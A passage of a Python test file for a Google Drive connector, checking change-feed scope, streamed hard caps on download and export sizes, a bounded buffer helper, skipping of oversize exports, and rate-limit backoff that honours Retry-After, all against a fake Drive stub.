    assert page.stale_scope_ids == frozenset()


async def test_my_drive_mode_keeps_consuming_the_whole_feed(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """The subtree proof is folder-mode only: for ``my_drive`` the account's
    feed IS the configured scope (parity with its full enumeration)."""
    fake_drive.add_file("anywhere", name="Anywhere", mime=_GDOC, export=b"a")
    _change(fake_drive, "anywhere")
    async with _client(fake_drive) as http:
        [page] = await _drain(
            CONNECTOR.fetch_changes(_source({"mode": "my_drive"}), "cur-1", _Run(http))  # type: ignore[arg-type]
        )
    assert [d.external_id for d in page.upserts] == ["anywhere"]


# --- content transfer is streamed and hard-capped ----------------------------


async def test_chunked_oversize_download_stops_reading_at_the_cap(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """Regression (ADR-0019 §5): a chunked body with no declared size must not
    be buffered whole.

    ``download_file`` used to materialize ``response.content`` and only then
    compare against ``GDRIVE_FETCH_MAX_BYTES`` — a missing or inaccurate Drive
    ``size`` therefore consumed unbounded worker memory and egress. The read
    now stops as soon as ``cap + 1`` bytes have arrived.
    """
    fake_drive.stream_media["big1"] = [b"x" * 16] * 100  # 1600 bytes, chunked
    async with _client(fake_drive) as http:
        payload = await gdrive_api.download_file(http, "big1", max_bytes=32)
    assert payload is None  # over the cap ⇒ skip-and-count, never truncated
    # 3 chunks (48 bytes) is enough to exceed a 32-byte cap; the other 97 are
    # never pulled off the wire.
    assert len(fake_drive.served_chunks) == 3


async def test_declared_oversize_download_is_refused_before_the_body(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """An oversized ``Content-Length`` is rejected without reading one byte."""
    fake_drive.stream_media["big2"] = [b"y" * 16] * 10
    fake_drive.stream_content_length["big2"] = "160"
    async with _client(fake_drive) as http:
        payload = await gdrive_api.download_file(http, "big2", max_bytes=32)
    assert payload is None
    assert fake_drive.served_chunks == []


async def test_chunked_oversize_export_stops_reading_at_the_cap(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """Exports have no size upfront at all — same streamed cap applies."""
    fake_drive.stream_media["exp1"] = [b"z" * 16] * 100
    async with _client(fake_drive) as http:
        payload = await gdrive_api.export_file(http, "exp1", mime_type="text/plain", max_bytes=32)
    assert payload is None
    assert len(fake_drive.served_chunks) == 3


def test_append_capped_never_grows_past_cap_plus_one() -> None:
    """Regression: the accumulator itself is bounded, not just the verdict.

    The first fix extended the buffer with the WHOLE yielded chunk before
    testing the cap, so one large transport frame — or a compressed body that
    decodes large — landed in memory in full and the "hard cap" was a fiction.
    Each append is now sliced to the remaining budget.
    """
    from app.connectors.gdrive.api import _append_capped

    buffer = bytearray()
    assert _append_capped(buffer, b"x" * 1_000_000, 32) is True  # over cap
    assert len(buffer) == 33  # cap + 1 — the proof, and not one byte more

    small = bytearray()
    assert _append_capped(small, b"abc", 32) is False
    assert bytes(small) == b"abc"


async def test_single_chunk_far_larger_than_the_cap_is_refused(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """One chunk, 100 KB, cap 32 bytes: refused after that single read."""
    fake_drive.stream_media["mega1"] = [b"m" * 100_000]
    async with _client(fake_drive) as http:
        payload = await gdrive_api.download_file(http, "mega1", max_bytes=32)
    assert payload is None
    assert len(fake_drive.served_chunks) == 1  # nothing more was pulled


async def test_under_cap_download_returns_the_whole_body(
    guard_stub: None, fake_drive: FakeDrive
) -> None:
    """The cap is a ceiling, not a truncation: an in-budget body arrives whole."""
    fake_drive.stream_media["ok1"] = [b"a" * 8, b"b" * 8]
    async with _client(fake_drive) as http:
        payload = await gdrive_api.download_file(http, "ok1", max_bytes=1024)
    assert payload == b"a" * 8 + b"b" * 8


async def test_oversize_export_skips_the_document(
    guard_stub: None, fake_drive: FakeDrive, monkeypatch: pytest.MonkeyPatch
) -> None:
    """End-to-end: an over-cap export is skipped and counted, not ingested."""
    from app.core.config import Settings, get_settings

    base = get_settings()
    tuned = Settings(**{**base.model_dump(by_alias=True), "GDRIVE_FETCH_MAX_BYTES": 32})
    monkeypatch.setattr("app.core.config.get_settings", lambda: tuned)

    fake_drive.add_file("doc1", name="Small", mime=_GDOC, export=b"tiny")
    fake_drive.add_file("doc2", name="Huge", mime=_GDOC)
    fake_drive.stream_media["doc2"] = [b"q" * 16] * 100
    async with _client(fake_drive) as http:
        result = await CONNECTOR.sync(_source({"mode": "my_drive"}), _Run(http))  # type: ignore[arg-type]
    assert isinstance(result, FullSyncResult)
    assert [d.external_id for d in result.docs] == ["doc1"]
    assert result.skipped_count == 1


# --- 429 backoff --------------------------------------------------------------


async def test_429_backoff_honours_retry_after(
    guard_stub: None, fake_drive: FakeDrive, monkeypatch: pytest.MonkeyPatch
) -> None:
    slept: list[float] = []

    async def _sleep(seconds: float) -> None:
        slept.append(seconds)

    monkeypatch.setattr(gdrive_api.asyncio, "sleep", _sleep)
    fake_drive.rate_limit_next = 2
    async with _client(fake_drive) as http:
        email = await CONNECTOR.fetch_account_email(http)
    assert email == "alice@acme.test"
    assert slept == [2.0, 2.0]  # the Retry-After header, honoured per attempt
